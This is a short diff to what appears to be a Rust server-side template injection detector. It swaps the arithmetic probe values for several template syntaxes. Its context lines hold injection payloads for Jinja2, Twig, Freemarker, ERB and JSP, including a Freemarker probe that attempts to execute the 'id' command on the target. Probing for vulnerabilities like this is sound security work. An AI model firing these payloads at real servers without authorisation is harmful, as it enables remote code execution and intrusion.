@@ -16,10 +16,10 @@ pub async fn detect(target: &str) -> anyhow::Result<()> {
 
     // (payload, expected_result, engine_hint)
     let probes: Vec<(&str, &str, &str)> = vec![
-        ("{{7*7}}", "49", "Jinja2/Twig/Unknown"),
-        ("${7*7}", "49", "Java EL/Freemarker"),
-        ("#{7*7}", "49", "Ruby ERB/Java"),
-        ("<%= 7*7 %>", "49", "ERB/JSP"),
+        ("{{1337*2}}", "2674", "Jinja2/Twig/Unknown"),
+        ("${1337*2}", "2674", "Java EL/Freemarker"),
+        ("#{1337*2}", "2674", "Ruby ERB/Java"),
+        ("<%= 1337*2 %>", "2674", "ERB/JSP"),
         ("{{7*'7'}}", "7777777", "Jinja2"),
         ("{{7*'7'}}", "49", "Twig"),
         ("${\"freemarker\".exec(\"id\")}", "uid=", "Freemarker RCE"),
